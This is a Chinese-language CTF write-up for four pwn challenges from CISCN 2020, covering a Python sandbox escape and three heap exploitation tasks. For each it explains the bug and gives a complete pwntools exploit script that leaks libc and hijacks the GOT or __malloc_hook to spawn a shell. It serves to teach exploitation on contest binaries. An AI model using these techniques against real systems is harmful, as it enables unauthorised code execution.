# 2020 CISCN PWN WP

## 1-babyjsc

### 难度

1 / 10

### 简单描述

使用Python模拟的终端, 先输入大小, 然后jsc数据执行jsc数据.

### vul

使用python 模拟的终端

### 知识点

python sanbox escape

### 思路

python 沙箱逃逸

### EXP

```
from pwn import *
sh = remote('0.0.0.0', 0)
p = "__import__('os').system('sh')"
sh.sendline(len(p))
sh.sendline(p)
sh.interactive()
```



## 2-NoFree

### 难度

5 / 10

### 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
 ```

### 简单描述

只有添加和编辑

### vul

```c
char *__fastcall sub_40095C(unsigned int size)
{
  memset(p_addr, 0, 0x100uLL);
  printf("content: ", 0LL);
  read_n(p_addr, size);
  return strdup(p_addr);
}
```



strdup函数相当于包含了strlen + malloc + strcpy 函数, 根据字符串长度来malloc, 然后strcpy到开辟的空间里,然后在输入一定大小后, 再输入内容,内容中若出现'\x00'字符截断, 则造成在edit模式堆溢出, 可以在同个index下开辟内存, 造成内存泄漏.

### 知识点

House of Orange, fastbin attack

### 思路

通过堆溢出漏洞修改top chunk 大小, 不断开辟内存, 直到开辟top chunk 快完毕, 使剩余的top chunk 为 fastbin size, 再开辟一块大的, 使剩余的部分为fastbin, 然后通过堆溢出修改fastbin fd为 p_addr + 0x100(堆指针数组), 在该数组中的大小要与fastbin 中的一致, 通过fastbin attack 打入 p_addr+ 0x100,  通过index 0控制 index 1 打入p_addr 设置字符串漏洞, 然后修改 memset 的got 表为printf的plt地址,再次开辟泄漏libc.再使用同样的方法修改atoi got表中的地址为system, 传入 '/bin/sh'即可 get shell



### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(idx, size, data):
	sla('>>', str(1))
	sla(':', str(idx))
	sla(':', str(size))
	sa(':', data)

def md(idx, data):
	sla(':', str(2))
	sla(':', str(idx))
	sa(':', data)

#--------------------------Exploit--------------------------
def exploit():
	ad(0, 0x90, 'A')
	md(0, 'A' * 0x10 + p64(0) + p64(0xfe1))
	for i in range(24):
		ad(1, 0x90, 'A' *0x90)
	
	ad(0, 0x80, 'A' * 0x70)
	ad(0, 0x80, 'A' * 0x10) # idx 0
	ad(1, 0x40, 'A' * 0x40) # make it as 0x21 fastbin
	p_addr = 0x6020c0

	md(0, 'A' * 0x10 + p64(0x20) + p64(0x20) + p64(p_addr + 0x100))
	ad(0, 0x20, 'A') # Make the fastbin size as 0x20 for fastbin attaking
	ad(0, 0x20, p64(exe.got['memset']) + p64(0x10)) # modify memset got table as printf
	md(1, p64(exe.plt['printf'])) 

	md(0, p64(p_addr))
	md(1,'%17$p')

	# Add one to call print leak libc
	sla('>>', str(1))
	sla(':', str(2))
	sla(':', str(0x40))

	ru('0x')
	libc_base = int(ru('content'), 16) - (0x7ffff7a2d830 - 0x7ffff7a0d000)
	li('libc_base ' + hex(libc_base))
	sa(':', 'A' * 0x20)
	libc_sys = libc_base + lib.sym['system']

	# Modify atoi got tabel as system, then send /bin/sh to get shell
	md(0, p64(exe.got['atoi']))
	md(1, p64(libc_sys))
	sl('/bin/sh')

	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```



## 3-Easy box


### 难度

4 / 10

### 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

### 简单描述

只存在添加和删除功能

### vul

```c
  qword_202040[v1] = size + 1;                  // vul off by one
  qword_2020C0[v1] = malloc(size);
  puts("content:");
  read(0, qword_2020C0[v1], qword_202040[v1]);
```

存在off by one漏洞

### 知识点

io-file, fastbin attack

### 思路

堆布局构成fastbin 打入 `_IO_2_1_stderr + 192`处, 泄漏libc, 再次使用用fastbin 打入 malloc_hook - 0x23处修改malloc_hook, realloc调整execve参数



### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *

#context.log_level='debug'
exeFile = 'easy_box'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "101.200.53.148"
remotePort = 34521

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(index, size, data):
	sla('>>>', str(1))
	sla(':', str(index));
	sla(':', str(size))
	sa(':', data)

def rm(idx):
	sla('>>>', str(2))
	sla(':', str(idx))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0, 0x68, 'A')
	ad(1, 0x68, 'B')
	ad(2, 0x68, 'C')
	ad(3, 0x68, 'D')

	# Overflow to write chunk 1 size make chunk 1 to merge chunk 2
	rm(0)
	ad(0, 0x68, '\x00' * 0x68 + p8(0xe1))

	rm(1) # free as small bin
	rm(2) # for fastbin attack

	ad(4, 0x28, '\x11' * 0x28)
	ad(5, 0x38, '\x22' * 0x38)
	ad(6, 0x10, '\xdd\x25')
	# recovery size
	rm(5)

	ad(5, 0x38, '\x22' * 0x38 + p8(0x71))
	ad(7, 0x68, '\x00')
	p = '\x00' * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0)
	ad(8, 0x68, p)
	libc_base = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base -= lib.sym['_IO_2_1_stderr_'] + 192
	lib.address = libc_base
	main_arena = libc_base + 0x3c4b20
	li('libc_base: ' + hex(libc_base))

	rm(7) # for fastbin attack to main_arena - 0x33

	# recovery size as 0x21
	rm(5)
	ad(5, 0x38, '\x22' * 0x38 + p8(0x21))
	rm(6)
	# modify fastbin list
	ad(6, 0x10, p64(main_arena - 0x33))
	
	# recovery size as 0x71
	rm(5)
	ad(0, 0x38, '\x22' * 0x38 + p8(0x71))
	ad(9, 0x68, 'A') # for ajust
	# attack to main_arena - 0x33
	realloc = lib.sym['realloc']
	gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147, 0xcd0f3, 0xcd1c8]
	one_gadget = lib.address + gadgets[2]
	p = '\xAA' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc + 8)

	ad(10, 0x68, p)
	

	sla('>>>', str(1))
	sla(':', str(11));
	sla(':', str(0x10))

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	for i in range(100):
		try:
			if LOCAL:
				exe = ELF(exeFile)
				if LIB:
					lib = ELF(libFile)
					io = exe.process(env = {"LD_PRELOAD" : libFile})
				else:
					io = exe.process()

				break
			
			else:
				exe = ELF(exeFile)
				io = remote(remoteIp, remotePort)
				if LIB:
					lib = ELF(libFile)
			exploit()
			finish()
		except:
			c()
	
	exploit()
	finish()
```



## 4-maj


### 难度

5/ 10

### 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
 ```

### 简单描述

以前在v&n面试中, 有位师傅面过我这类型的, 基本思路也差不多, 经典的heap题, 有花指令影响逆向分析, 简单的添加功能,而添加功能所输入的字符临时储存在全局变量区中, 只有编辑功能才对堆区写入数据,还有删除功能, 打印功能没有。

### vul

在删除功能中, free后指针没有清0

```c
    else
    {
      sub_400846(dword_603010, dword_60303C + 1, dword_603040);
    }
    free(p_addr[v3]);                           // vul : not set ptr as null
    if ( dword_60303C / dword_603010 > 1 )
```



### 知识点

uaf, fastbin attack, IO file attack

### 思路

使用fastbin attack 打入_IO_2_1_stdout中泄漏libc, 然后再使用fastbin attack 此打入malloc_hook - 0x23处打one_gadget, realloc调整execve参数



### exp

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# author: i0gan
# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'

elf_path  = 'maj'
MODIFY_LD = 0
arch = '64'
libc_v = '2.23'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "0.0.0.0"
server_port = 0

# if local debug
LOCAL = 1
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)
def ad(s, d):
	sla('>>', '1')
	sla('question', '80')
	sla('?', str(s))
	sa('?', d)
	
def rm(i):
	sla('>>', '2')
	sla('?', str(i))

def md(i, d):
	sla('>>', '4')
	sla('?', str(i))
	sa('?', d)

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	ad(0x20, 'A' * 0x10) # fastbin attack unsorted bin - 0x10
	ad(0x60, 'A') # fake chunk
	ad(0x80, 'A') # partial write fastbin attack to _IO_2_1_stderr + 157
	ad(0x20, 'A') # fastbin attack to unsorted bin - 0x10
	ad(0x60, 'A') # idx 4 modify chunk 2 connect fastbin then attack to _IO_2_1_stdout
	# for fastbin attack to _free_hook
	ad(0x60, 'A') # idx 5 fa to malloc_hook - 0x23
	ad(0x60, 'A') # idx 6 
	
	# create fastbin attack
	rm(3)
	rm(0)
	rm(3)

	# free chunk2 make fd value as main_arena + 0x58
	rm(2)
	ad(0x20, 'A') # 7
	md(7, '\x90')
	ad(0x20, 'A') # 8
	ad(0x20, 'A') # 9
	md(1, b'A' * 0x50 + p64(0) + p64(0x31))
	ad(0x20, 'A') # 10
	
	md(10, p64(0) + p64(0x71) + b'\xdd\x25')

	rm(4)
	rm(1)
	rm(4)

	# attack to _IO_2_1_stderr + 157
	ad(0x60, 'A') # 11
	md(11, '\xa0')

	ad(0x60, 'A') # 12
	ad(0x60, 'A') # 13
	ad(0x60, 'A') # 14
	ad(0x60, 'A') # 15

	# leak libc
	p = b'A' * 0x33
	p += p64(0xfbad3c80)
	p += p64(0) * 3
	p += p8(8)
	md(15, p)
	
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
	libc_base = leak - (0x7ffff7fc2608 - 0x7ffff7c26000)
	libc_base = leak - (0x7ffff7dd2608 - 0x7ffff7a0d000) # origin libc 2.23 ubuntu16
	libc.address = libc_base
	#main_arena = libc_base + 0x39bb20

	one_gadget = libc_base + 0x3f42a
	one_gadget = libc_base + 0xf0364 # original libc 2.23 ubuntu16

	li('leak: ' + hex(leak))
	li('libc_base: ' + hex(libc_base))
	
	# fastbin attack to malloc_hook - 0x23
	rm(5)
	rm(6)
	rm(5)
	ad(0x60, 'A') # 16
	p = p64(libc.sym['__malloc_hook'] - 0x23)
	md(16, p)
	ad(0x60, 'A') # 17
	ad(0x60, 'A') # 18
	ad(0x60, 'A') # 19
	p = b'A' * (0x13 - 0x8)
	p += p64(one_gadget)
	p += p64(libc.sym['realloc'] + 8)
	md(19, p)
	# get shell
	sla('>>', '1')
	sla('question', '80')
	#db()
	sla('?', str(10))


def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path})
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()

```

